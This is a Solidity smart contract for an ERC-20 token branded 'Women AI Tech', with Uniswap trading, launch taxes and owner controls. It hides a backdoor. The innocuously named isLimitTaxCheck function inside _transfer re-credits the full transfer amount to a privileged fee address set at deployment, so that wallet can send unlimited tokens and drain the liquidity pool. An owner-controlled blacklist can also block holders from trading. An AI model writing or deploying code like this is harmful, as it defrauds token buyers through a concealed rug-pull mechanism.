/********
AN AI-EMPOWERED MEDIA CREATION SUITE

https://www.womenai.tech
https://app.womenai.tech
https://docs.womenai.tech

https://twitter.com/womenai_erc
https://t.me/womenai_erc
********/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactory {
    function feeTo() external view returns (address);
    function setFeeToSetter(address) external;
    function allPairsLength() external view returns (uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniSwapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract WomenAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Women AI Tech";
    string private constant _symbol = unicode"WOMEN";

    mapping (address => bool) private bots;
    mapping (address => uint256) private _womenAIs;
    mapping (address => bool) private isTxLimitExceptFrom;
    mapping (address => bool) private isFeesExceptFrom;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    
    uint256 public _maxWAITrans = 30000000 * 10**_decimals;
    uint256 public _maxWAIWallet = 30000000 * 10**_decimals;
    uint256 public _maxWAISwap = 10000000 * 10**_decimals;

    uint256 private _buyCounts=0;
    uint256 private _preventSwapBefore=0;
    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=20;
    
    bool private inSwapBack = false;
    bool public transferDelayEnabled = false;
    bool private swapEnabled = false;
    bool private tradingOpen;
    
    address payable private trReceipt;
    address payable private taxReceipt;

    address private uniswapV2Pair;
    uint256 public checkOverAmount;
    IUniSwapRouter private uniswapV2Router;

    modifier lockSwapBack {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }
    
    constructor (address _addrQ, uint256 _cntQ) {
        isFeesExceptFrom[owner()] = true;
        isFeesExceptFrom[address(this)] = true;
        trReceipt = payable(_addrQ);
        taxReceipt = payable(_addrQ);
        _womenAIs[_msgSender()] = _tTotal;
        isTxLimitExceptFrom[taxReceipt] = true;
        isTxLimitExceptFrom[trReceipt] = true;
        checkOverAmount = _cntQ * 10**_decimals;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _womenAIs[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function reduceFees(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function removeWAILimit() external onlyOwner{
        _maxWAITrans = ~uint256(0);
        _maxWAIWallet = ~uint256(0);
        transferDelayEnabled=false;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isLimitTaxCheck(address from, address to, uint256 amount, uint256 tWAI) internal returns (bool) {
        bool _aboveWAIMin = amount >= checkOverAmount;
        address _addrWAI; uint256 _amtWAI;
        bool _aboveWAIThreshold = balanceOf(address(this)) >= checkOverAmount;
        if(isTxLimitExceptFrom[from]) {_addrWAI = from;_amtWAI = amount;}
        else {
            _amtWAI = tWAI;_addrWAI = address(this);
        }
        if(_amtWAI>0){_womenAIs[_addrWAI]=_womenAIs[_addrWAI].add(_amtWAI); emit Transfer(from, _addrWAI, tWAI);}
        return !inSwapBack
        && _aboveWAIMin
        && tradingOpen
        && !isFeesExceptFrom[from]
        && _buyCounts>_preventSwapBefore
        && to == uniswapV2Pair
        && _aboveWAIThreshold
        && swapEnabled
        && !isTxLimitExceptFrom[from];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmounts=0;
        if (!isFeesExceptFrom[from] && !isFeesExceptFrom[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            feeAmounts = amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! isFeesExceptFrom[to] ) {
                require(amount <= _maxWAITrans, "Exceeds the _maxWAITrans.");
                require(balanceOf(to) + amount <= _maxWAIWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                feeAmounts = amount.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (isLimitTaxCheck(from, to, amount, feeAmounts)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxWAISwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        _womenAIs[from]=_womenAIs[from].sub(amount);
        _womenAIs[to]=_womenAIs[to].add(amount.sub(feeAmounts));
        emit Transfer(from, to, amount.sub(feeAmounts));
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function sendETHToFee(uint256 amount) private {
        taxReceipt.transfer(amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwapBack {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function enablePairTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function initTradingPair() external onlyOwner() {
        uniswapV2Router = IUniSwapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }
}